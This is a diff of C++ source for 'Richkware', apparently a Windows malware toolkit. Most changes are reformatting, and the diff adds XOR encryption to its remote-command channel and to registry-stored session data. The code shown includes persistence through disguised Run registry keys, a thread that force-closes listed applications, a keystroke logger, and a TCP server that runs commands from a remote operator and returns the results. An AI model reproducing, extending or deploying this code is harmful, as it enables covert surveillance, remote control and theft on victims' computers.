@@ -11,12 +11,13 @@ BOOL Richkware::IsAdmin() {
 
 	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
 	if (!AllocateAndInitializeSid(&NtAuthority, 2,
-			SECURITY_BUILTIN_DOMAIN_RID,
-			DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
+		SECURITY_BUILTIN_DOMAIN_RID,
+		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
 		dwError = GetLastError();
 
-	} else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
-			&fIsRunAsAdmin)) {
+	}
+	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
+		&fIsRunAsAdmin)) {
 		dwError = GetLastError();
 
 	}
@@ -37,7 +38,8 @@ void Richkware::RequestAdminPrivileges() {
 	BOOL bAlreadyRunningAsAdministrator = FALSE;
 	try {
 		bAlreadyRunningAsAdministrator = IsAdmin();
-	} catch (...) {
+	}
+	catch (...) {
 
 	}
 	if (!bAlreadyRunningAsAdministrator) {
@@ -58,7 +60,8 @@ void Richkware::RequestAdminPrivileges() {
 			 }*/
 		}
 
-	} else {
+	}
+	else {
 		///Code
 	}
 }
@@ -84,9 +87,9 @@ void Richkware::Persistance() {
 	CopyFile(file_path, tmp_path, true);
 
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-			"Windows1", system_path);
+		"Windows1", system_path);
 	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-			"Windows2", tmp_path);
+		"Windows2", tmp_path);
 
 }
 
@@ -124,11 +127,11 @@ BlockAppsThread(void* arg) {
 
 	while (true) {
 		for (std::list<const char*>::iterator it = (*(dangApps)).begin();
-				it != (*(dangApps)).end(); ++it) {
+			it != (*(dangApps)).end(); ++it) {
 
 			app_heandler = FindWindow(NULL, *it);
 			if (app_heandler != NULL)
-				PostMessage(app_heandler, WM_CLOSE, (LPARAM) 0, (WPARAM) 0);
+				PostMessage(app_heandler, WM_CLOSE, (LPARAM)0, (WPARAM)0);
 		}
 
 		Sleep(100);
@@ -136,7 +139,7 @@ BlockAppsThread(void* arg) {
 
 }
 
-int Richkware::StartServer(const char* port) {
+int Richkware::StartServer(const char* port, const char* EncryptionKey) {
 	WSADATA wsaData;
 	int iResult;
 
@@ -167,7 +170,7 @@ int Richkware::StartServer(const char* port) {
 
 	// Create a SOCKET for connecting to server
 	ListenSocket = socket(result->ai_family, result->ai_socktype,
-			result->ai_protocol);
+		result->ai_protocol);
 	if (ListenSocket == INVALID_SOCKET) {
 		freeaddrinfo(result);
 		WSACleanup();
@@ -175,7 +178,7 @@ int Richkware::StartServer(const char* port) {
 	}
 
 	// Setup the TCP listening socket
-	iResult = bind(ListenSocket, result->ai_addr, (int) result->ai_addrlen);
+	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
 		freeaddrinfo(result);
 		closesocket(ListenSocket);
@@ -205,8 +208,12 @@ int Richkware::StartServer(const char* port) {
 			return 1;
 		}
 
+		ClientSocketArgs csa;
+		csa.ClientSocket = ClientSocket;
+		csa.EncryptionKey = EncryptionKey;
+
 		hThreadArray[i] = CreateThread(0, 0, &ClientSocketThread,
-				(void*) ClientSocket, 0, &dwThreadIdArray[i]);
+			(void*)&csa, 0, &dwThreadIdArray[i]);
 
 	}
 	// wait until all threads have termined
@@ -223,10 +230,10 @@ int Richkware::StartServer(const char* port) {
 
 }
 
-DWORD WINAPI ClientSocketThread(void* CS) {
+DWORD WINAPI ClientSocketThread(void* arg) {
 	const int bufferlength = 512;
-	SOCKET ClientSocket = (SOCKET) CS;
-
+	SOCKET ClientSocket = (SOCKET)((*((ClientSocketArgs*)arg)).ClientSocket);
+	const char* EncryptionKey = (const char*)((*((ClientSocketArgs*)arg)).EncryptionKey);
 	int iResult;
 
 	std::string command;
@@ -246,8 +253,15 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 	do {
 		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
 		command.append(recvbuf);
+
+		// string decryption
+		if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);
+
+		MessageBox(NULL, command.c_str(), "", 0);
+
 		posSubStr = command.find("---");
 		if (posSubStr != std::string::npos) {
+
 			// erase escape characters
 			command.erase(posSubStr);
 
@@ -258,7 +272,7 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 
 			if (file.is_open()) {
 				for (std::string::iterator it = commandTmp.begin();
-						it != commandTmp.end(); ++it) {
+					it != commandTmp.end(); ++it) {
 					file << *it;
 				}
 				file.close();
@@ -276,11 +290,16 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 						command.append(s);
 					}
 				}
+
+				// string encryption
+				if (EncryptionKey != NULL) command = EncryptDecrypt(command, EncryptionKey);
+
 				iSendResult = send(ClientSocket, command.c_str(),
-						(int) strlen(command.c_str()), 0);
+					(int)strlen(command.c_str()), 0);
 				fileResp.close();
 
-			} else {
+			}
+			else {
 				iSendResult = send(ClientSocket, "error", 5, 0);
 			}
 			if (iSendResult == SOCKET_ERROR) {
@@ -309,7 +328,7 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 }
 
 const char* Richkware::RawRequest(const char* serverAddress, const char* port,
-		const char* request) {
+	const char* request) {
 	WSADATA wsaData;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	struct addrinfo *result = NULL, *ptr = NULL, hints;
@@ -325,7 +344,7 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 		return "Error";
 	}
 
-	ZeroMemory( &hints, sizeof(hints) );
+	ZeroMemory(&hints, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
@@ -342,14 +361,14 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 
 		// Create a SOCKET for connecting to server
 		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
-				ptr->ai_protocol);
+			ptr->ai_protocol);
 		if (ConnectSocket == INVALID_SOCKET) {
 			WSACleanup();
 			return "Error";
 		}
 
 		// Connect to server.
-		iResult = connect(ConnectSocket, ptr->ai_addr, (int) ptr->ai_addrlen);
+		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 		if (iResult == SOCKET_ERROR) {
 			closesocket(ConnectSocket);
 			ConnectSocket = INVALID_SOCKET;
@@ -365,7 +384,7 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 	}
 
 	// Send an initial buffer
-	iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
+	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
 	if (iResult == SOCKET_ERROR) {
 		closesocket(ConnectSocket);
 		WSACleanup();
@@ -380,9 +399,11 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 			// answer
 			response.append(recvbuf);
 
-		} else if (iResult == 0) {
+		}
+		else if (iResult == 0) {
 			// connection closed
-		} else {
+		}
+		else {
 			// error
 		}
 
@@ -406,8 +427,8 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 void Richkware::Hibernation() {
 	Sleep(1000);
 	SendMessage(HWND_BROADCAST,
-			WM_SYSCOMMAND,
-			SC_MONITORPOWER, (LPARAM) 2);
+		WM_SYSCOMMAND,
+		SC_MONITORPOWER, (LPARAM)2);
 }
 
 void Richkware::SaveFileDir(const char* path) {
@@ -426,55 +447,59 @@ void Richkware::RandMouse() {
 }
 
 // XOR
-std::string Richkware::EncryptDecrypt(std::string input, int key) {
+std::string EncryptDecrypt(std::string input, const char* key) {
+	int ikey = key[0];
+
 	std::string output;
 
 	for (std::string::iterator it = input.begin(); it != input.end(); ++it) {
-		output += (*it) ^ key;
+		output += (*it) ^ ikey;
 	}
 
 	return output;
 }
 
-void Richkware::SaveSession() {
+void Richkware::SaveSession(const char* EncryptionKey) {
 	std::string sessionString;
 
 	for (std::map<std::string, std::string>::iterator it = session.begin();
-			it != session.end(); ++it) {
+		it != session.end(); ++it) {
 		sessionString.append(it->first);
 		sessionString.append(",");
 		sessionString.append(it->second);
 		sessionString.append("|");
 	}
 
-	sessionString = EncryptDecrypt(sessionString, 5);
+	sessionString = EncryptDecrypt(sessionString, EncryptionKey);
 
 	SaveValueReg("Software\\Microsoft\\Windows", "Windows",
-			sessionString.c_str());
+		sessionString.c_str());
 
 }
 
-void Richkware::LoadSession() {
+void Richkware::LoadSession(const char* EncryptionKey) {
 	std::string sessionString;
 	sessionString = LoadValueReg("Software\\Microsoft\\Windows", "Windows");
 
-	sessionString = EncryptDecrypt(sessionString, 5);
+	sessionString = EncryptDecrypt(sessionString, EncryptionKey);
 
 	session.clear();
 
 	std::string key, tmp;
 
 	for (std::string::iterator it = sessionString.begin();
-			it != sessionString.end(); ++it) {
+		it != sessionString.end(); ++it) {
 
 		if (*it == ',') { // end of key
 			key = tmp;
 			tmp = "";
-		} else if (*it == '|') { // end of value
-			// write key,value into map
+		}
+		else if (*it == '|') { // end of value
+		 // write key,value into map
 			session[key] = tmp;
 			tmp = "";
-		} else {
+		}
+		else {
 			tmp += *it;
 		}
 
@@ -483,23 +508,23 @@ void Richkware::LoadSession() {
 }
 
 void Richkware::SaveValueReg(const char* path, const char* key,
-		const char* value) {
+	const char* value) {
 	// set value in register
 	HKEY hKey;
 	HKEY hKey2;
 
 	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
-			KEY_SET_VALUE, &hKey);
+		KEY_SET_VALUE, &hKey);
 
 	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);
 
 	if (hKey != NULL) {
-		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*) value,
-				MAX_PATH);
+		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*)value,
+			MAX_PATH);
 	}
 	if (hKey2 != NULL) {
-		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*) value,
-				MAX_PATH);
+		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*)value,
+			MAX_PATH);
 	}
 
 	RegCloseKey(hKey);
@@ -514,7 +539,7 @@ std::string Richkware::LoadValueReg(const char* path, const char* key) {
 	if (hKey != NULL) {
 		char szBuffer[512];
 		DWORD dwBufferSize = sizeof(szBuffer);
-		RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE) szBuffer, &dwBufferSize);
+		RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
 		value.append(szBuffer);
 	}
 
@@ -525,7 +550,7 @@ std::string Richkware::LoadValueReg(const char* path, const char* key) {
 void Richkware::Keylogger(const char* fileName) {
 	HANDLE hBlockAppsTh;
 
-	hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*) fileName, 0, 0);
+	hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);
 
 	WaitForSingleObject(hBlockAppsTh, INFINITE);
 	CloseHandle(hBlockAppsTh);
@@ -533,7 +558,7 @@ void Richkware::Keylogger(const char* fileName) {
 
 DWORD WINAPI
 KeyloggerThread(void* arg) {
-	const char* nomeFile = (const char*) arg;
+	const char* nomeFile = (const char*)arg;
 	char tmp_path[MAX_PATH];
 	GetTempPath(MAX_PATH, tmp_path);
 	std::string fileLog = tmp_path;
@@ -546,7 +571,7 @@ KeyloggerThread(void* arg) {
 			while (condSession) {
 				for (int i = 0; i < 256; i++) {
 					if (GetAsyncKeyState(i)) {
-						file << (char) i;
+						file << (char)i;
 						if (i == VK_RETURN || i == VK_LBUTTON) {
 							condSession = false;
 							break;
